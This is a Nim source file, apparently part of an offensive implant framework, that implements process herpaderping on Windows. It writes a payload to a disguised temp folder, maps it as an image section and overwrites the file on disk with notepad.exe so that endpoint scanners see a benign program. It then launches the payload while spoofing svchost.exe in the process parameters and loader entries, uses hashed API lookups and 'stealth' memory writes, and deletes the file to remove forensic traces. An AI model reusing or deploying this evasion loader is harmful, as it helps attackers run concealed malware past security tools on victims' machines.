import winim, os
import ../core/syscalls, ../core/resolver, strutils, ../core/utils

# --- SEC_IMAGE Constant ---
const SEC_IMAGE = 0x1000000.ULONG

# --- Manual Definitions for Process Ghosting ---

type
    CURDIR {.pure.} = object
        DosPath: UNICODE_STRING
        Handle: HANDLE

    # RTL_USER_PROCESS_PARAMETERS structure (Accurate for x64)
    RTL_USER_PROCESS_PARAMETERS_STRUCT {.pure.} = object
        MaximumLength: ULONG
        Length: ULONG
        Flags: ULONG
        DebugFlags: ULONG
        ConsoleHandle: HANDLE
        ConsoleFlags: ULONG
        StandardInput: HANDLE
        StandardOutput: HANDLE
        StandardError: HANDLE
        CurrentDirectory: CURDIR
        DllPath: UNICODE_STRING
        ImagePathName: UNICODE_STRING
        CommandLine: UNICODE_STRING
        Environment: pointer
        StartingX: ULONG
        StartingY: ULONG
        CountX: ULONG
        CountY: ULONG
        CountCharsX: ULONG
        CountCharsY: ULONG
        FillAttribute: ULONG
        WindowFlags: ULONG
        ShowWindowFlags: ULONG
        WindowTitle: UNICODE_STRING
        DesktopInfo: UNICODE_STRING
        ShellInfo: UNICODE_STRING
        RuntimeData: UNICODE_STRING

    PROCESS_BASIC_INFORMATION_STRUCT = object
        ExitStatus: NTSTATUS
        PebBaseAddress: pointer
        AffinityMask: ULONG_PTR
        BasePriority: KPRIORITY
        UniqueProcessId: HANDLE
        InheritedFromUniqueProcessId: HANDLE



proc rtl_init_unicode_string(str: PUNICODE_STRING, source: WideCString) =
    var count = 0
    while cast[ptr uint16](cast[uint64](source) + cast[uint64](count * 2))[] != 0:
        count += 1
    
    let length = cast[USHORT](count * 2)
    str.Length = length
    str.MaximumLength = length + 2
    str.Buffer = cast[PWSTR](source)

proc get_entry_point(hProcess: HANDLE, section_base: pointer): uint64 =
    if section_base == nil: return 0
    var dos: IMAGE_DOS_HEADER
    var nt: IMAGE_NT_HEADERS64
    var bytesRead: SIZE_T
    if NtReadVirtualMemory(hProcess, section_base, addr dos, sizeof(dos).SIZE_T, addr bytesRead) != 0: return 0
    if dos.e_magic != 0x5A4D: return 0
    let nt_addr = cast[pointer](cast[uint64](section_base) + cast[uint64](dos.e_lfanew))
    if NtReadVirtualMemory(hProcess, nt_addr, addr nt, sizeof(nt).SIZE_T, addr bytesRead) != 0: return 0
    return cast[uint64](section_base) + cast[uint64](nt.OptionalHeader.AddressOfEntryPoint)

proc herpaderp_process*(payload_bytes: seq[byte], target_cmd: string): HANDLE =
    let ntdll = get_module_base(hash_api("ntdll.dll"))
    
    type RtlCreateProcessParametersExFn = proc(pParams: ptr PRTL_USER_PROCESS_PARAMETERS, img: PUNICODE_STRING, dll: PUNICODE_STRING, cur: PUNICODE_STRING, cmd: PUNICODE_STRING, env: pointer, win: PUNICODE_STRING, desk: PUNICODE_STRING, shell: PUNICODE_STRING, runtime: PUNICODE_STRING, flags: ULONG): NTSTATUS {.stdcall.}
    let pRtlCreate = cast[RtlCreateProcessParametersExFn](get_proc_address_hashed(ntdll, hash_api("RtlCreateProcessParametersEx")))

    if pRtlCreate == nil: return 0

    let seed = cast[int](GetTickCount64()) xor cast[int](GetCurrentProcessId())
    let temp_folder = getEnv("TEMP")
    
    # Extract just the filename from target_cmd (e.g. "svchost.exe")
    var baseName = ""
    let parts = target_cmd.split('\\')
    if parts.len > 0: baseName = parts[parts.len - 1]
    if baseName == "": baseName = "svchost.exe"

    # Create the file with the exact same name as the target to fool Task Manager's image name lookup
    # We add a hidden subfolder inside temp to avoid collisions, or just append the seed to the folder name
    let hide_folder = temp_folder & "\\WinUpdate_" & $seed
    
    var temp_file = ""
    if temp_folder != "":
        CreateDirectoryA(hide_folder, nil)
        temp_file = hide_folder & "\\" & baseName
    else:
        temp_file = "C:\\Windows\\Temp\\" & baseName
    
    # log_debug("[Herpaderp] Temp file: " & temp_file)
    
    # Share Mode: FILE_SHARE_READ(1) | FILE_SHARE_WRITE(2) | FILE_SHARE_DELETE(4) = 7
    var hFile = CreateFileA(temp_file, GENERIC_READ or GENERIC_WRITE or DELETE, 7, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0)
    if hFile == INVALID_HANDLE_VALUE: return 0

    var bytesWritten: DWORD
    if WriteFile(hFile, addr payload_bytes[0], cast[DWORD](payload_bytes.len), addr bytesWritten, nil) == 0:
        CloseHandle(hFile); return 0

    # [Herpaderping Modification]
    # Do NOT mark for deletion. We will map the section, then overwrite the disk file with benign content.
    var hSection: HANDLE
    let s_status = NtCreateSection(addr hSection, SECTION_ALL_ACCESS, nil, nil, PAGE_READONLY, SEC_IMAGE, hFile)
    if s_status != 0:
        CloseHandle(hFile); return 0
    
    # 💥 HERPADERPING MAGIC 💥
    # 1. We mapped the payload into kernel memory (hSection).
    # 2. Now we overwrite the disk file with a legitimate 윈도우 program (notepad.exe) 
    # so EDR disk scanners see nothing but a normal Windows executable.
    
    try:
        let sacrificeBytes = readFile("C:\\windows\\System32\\notepad.exe")
        # Reset file pointer to beginning
        SetFilePointer(hFile, 0, nil, FILE_BEGIN)
        var newBytesWritten: DWORD
        WriteFile(hFile, unsafeAddr sacrificeBytes[0], cast[DWORD](sacrificeBytes.len), addr newBytesWritten, nil)
        
        # If payload was larger than sacrifice, truncate the end so it looks exactly like sacrifice
        SetEndOfFile(hFile)
    except:
        log_debug("[Herpaderp] Warning: Failed to overwrite disk file. Continuing anyway.")
        discard

    CloseHandle(hFile)

    var hProcess: HANDLE
    # Flag 0x4 = PROCESS_CREATE_FLAGS_BREAKAWAY_FROM_JOB (to survive parent exit)
    let p_status = NtCreateProcessEx(addr hProcess, PROCESS_ALL_ACCESS, nil, cast[HANDLE](-1), 0, hSection, 0, 0, 0)
    if p_status != 0:
        CloseHandle(hSection); return 0

    var pbi: PROCESS_BASIC_INFORMATION_STRUCT
    var retLen: ULONG
    if syscalls.NtQueryInformationProcess(hProcess, 0, addr pbi, cast[ULONG](sizeof(pbi)), addr retLen) != 0:
        CloseHandle(hProcess); CloseHandle(hSection); return 0

    var imageBase: pointer
    let imageBaseOffset = if sizeof(pointer) == 8: 0x10 else: 0x08
    let ib_status = NtReadVirtualMemory(hProcess, cast[pointer](cast[uint64](pbi.PebBaseAddress) + cast[uint64](imageBaseOffset)), addr imageBase, sizeof(pointer).SIZE_T, nil)
    if ib_status != 0 or imageBase == nil:
        CloseHandle(hProcess); CloseHandle(hSection); return 0

    # ✅ Setup Parameters (Spoofing svchost.exe)
    var uImg, uCmd, uCur, uDll: UNICODE_STRING
    # Spoof as svchost.exe
    # ✅ Dynamic Spoofing based on actual target
    var wImg = newWideCString(target_cmd) 
    var wCmd = newWideCString(target_cmd) # Start with simple cmd line
    var wCur = newWideCString("C:\\Windows\\System32")
    var wDll = newWideCString("C:\\Windows\\System32")
    
    rtl_init_unicode_string(addr uImg, wImg)
    rtl_init_unicode_string(addr uCmd, wCmd) # Use target_cmd directly for cmdline simple test
    rtl_init_unicode_string(addr uCur, wCur)
    rtl_init_unicode_string(addr uDll, wDll)
    
    var pParams: PRTL_USER_PROCESS_PARAMETERS = nil
    
    # 1. Get Local Environment
    let kernel32 = get_module_base(hash_api("kernel32.dll"))
    type GetEnvironmentStringsWFn = proc(): pointer {.stdcall.}
    type FreeEnvironmentStringsWFn = proc(p: pointer): WINBOOL {.stdcall.}
    let pGetEnvArr = cast[GetEnvironmentStringsWFn](get_proc_address_hashed(kernel32, hash_api("GetEnvironmentStringsW")))
    let pFreeEnvArr = cast[FreeEnvironmentStringsWFn](get_proc_address_hashed(kernel32, hash_api("FreeEnvironmentStringsW")))
    let env_local = if pGetEnvArr != nil: pGetEnvArr() else: nil

    # 2. Create Params (Local) - Flag 0 (De-normalized/Offsets)
    # This creates a self-contained block where strings are offsets within the block.
    # This is much easier to inject into a remote process.
    let r_status = pRtlCreate(addr pParams, addr uImg, addr uDll, addr uCur, addr uCmd, env_local, nil, nil, nil, nil, 0) 
    
    if r_status != 0 or pParams == nil:
        if env_local != nil and pFreeEnvArr != nil: discard pFreeEnvArr(env_local)
        CloseHandle(hProcess); CloseHandle(hSection); return 0

    let pLoc = cast[ptr RTL_USER_PROCESS_PARAMETERS_STRUCT](pParams)
    let paramsSize = pLoc.MaximumLength

    # 3. Handle Environment Copying
    var remoteEnv: pointer = nil
    if pLoc.Environment != nil:
        var envSize = 0
        let pEnvArr = cast[ptr UncheckedArray[uint16]](pLoc.Environment)
        while true:
            if pEnvArr[envSize] == 0 and pEnvArr[envSize+1] == 0:
                envSize += 2
                break
            envSize += 1
            if envSize > 524288: break
        
        let envBytes = envSize * 2
        remoteEnv = StealthAllocate(hProcess, envBytes, PAGE_READWRITE)
        if remoteEnv != nil:
            discard StealthWrite(hProcess, remoteEnv, pLoc.Environment, envBytes)
            pLoc.Environment = remoteEnv # Link remote env pointer
    
    # 4. Allocate and Write Parameters
    var remoteParams = StealthAllocate(hProcess, paramsSize.int, PAGE_READWRITE)
    if remoteParams == nil:
        CloseHandle(hProcess); CloseHandle(hSection); return 0

    # 5. Simple write for self-contained Flag 0 block.
    if not StealthWrite(hProcess, remoteParams, pParams, paramsSize.int):
        CloseHandle(hProcess); CloseHandle(hSection); return 0

    # 6. Link to PEB (PROPER ORDER)
    # 1st: ImageBaseAddress (Offset 0x10)
    discard StealthWrite(hProcess, cast[pointer](cast[uint64](pbi.PebBaseAddress) + 0x10), addr imageBase, sizeof(pointer))
    # 2nd: ProcessParameters (Offset 0x20)
    discard StealthWrite(hProcess, cast[pointer](cast[uint64](pbi.PebBaseAddress) + 0x20), addr remoteParams, sizeof(pointer))

    # Cleanup Local Resources (Only if local structure is truly copy-safe)
    if env_local != nil and pFreeEnvArr != nil: discard pFreeEnvArr(env_local)
    # Important: RtlDestroyProcessParameters should be done after the write. 
    # But for Flag 0 (Offsets), the remote copy is self-sufficient.
    if pParams != nil:
        type RtlDestroyProcessParametersFn = proc(p: PRTL_USER_PROCESS_PARAMETERS): NTSTATUS {.stdcall.}
        let pRtlDestroy = cast[RtlDestroyProcessParametersFn](get_proc_address_hashed(ntdll, hash_api("RtlDestroyProcessParameters")))
        if pRtlDestroy != nil: discard pRtlDestroy(pParams)

    # 7. Start Process in SUSPENDED state for LDR Spoofing
    let pRtlUserThreadStart = get_proc_address_hashed(ntdll, hash_api("RtlUserThreadStart"))
    let entry_point = get_entry_point(hProcess, imageBase)
    
    if pRtlUserThreadStart != nil and entry_point != 0:
        var hThread: HANDLE = 0
        # Flag 0x1 = THREAD_CREATE_FLAGS_CREATE_SUSPENDED
        let status = NtCreateThreadEx(addr hThread, THREAD_ALL_ACCESS, nil, hProcess, pRtlUserThreadStart, cast[pointer](entry_point), 0x1.ULONG, 0, 0, 0, nil)
        
        if status == 0:
            # 8. LDR Spoofing while process is suspended
            var loaderDataPtr: pointer
            if NtReadVirtualMemory(hProcess, cast[pointer](cast[uint64](pbi.PebBaseAddress) + 0x18), addr loaderDataPtr, sizeof(pointer), nil) == 0 and loaderDataPtr != nil:
                var head: LIST_ENTRY
                if NtReadVirtualMemory(hProcess, cast[pointer](cast[uint64](loaderDataPtr) + 0x10), addr head, sizeof(head), nil) == 0:
                    let firstEntry = head.Flink
                    
                    let remoteStrBase = cast[uint64](remoteParams)
                    var uFullRemote, uBaseRemote: UNICODE_STRING
                    
                    uFullRemote.Length = pLoc.ImagePathName.Length
                    uFullRemote.MaximumLength = pLoc.ImagePathName.MaximumLength
                    uFullRemote.Buffer = cast[PWSTR](remoteStrBase + cast[uint64](pLoc.ImagePathName.Buffer))
                    
                    uBaseRemote.Length = pLoc.CommandLine.Length
                    uBaseRemote.MaximumLength = pLoc.CommandLine.MaximumLength
                    uBaseRemote.Buffer = cast[PWSTR](remoteStrBase + cast[uint64](pLoc.CommandLine.Buffer))

                    discard StealthWrite(hProcess, cast[pointer](cast[uint64](firstEntry) + 0x48), addr uFullRemote, sizeof(uFullRemote))
                    discard StealthWrite(hProcess, cast[pointer](cast[uint64](firstEntry) + 0x58), addr uBaseRemote, sizeof(uBaseRemote))

            # 9. Finally Resume Thread
            ResumeThread(hThread)
            CloseHandle(hThread)
        else:
            # Direct/Emergency start if NtCreateThreadEx fails
            # This will not have LDR spoofing applied.
            hThread = 0
            discard NtCreateThreadEx(addr hThread, THREAD_ALL_ACCESS, nil, hProcess, cast[pointer](entry_point), nil, 0, 0, 0, 0, nil)
            if hThread != 0: CloseHandle(hThread)
    
    CloseHandle(hSection)

    # 임시 폴더 정리 (포렌식 아티팩트 제거)
    try:
        if temp_file != "":
            discard DeleteFileA(temp_file)
        if hide_folder != "":
            discard RemoveDirectoryA(hide_folder)
    except: discard

    return hProcess
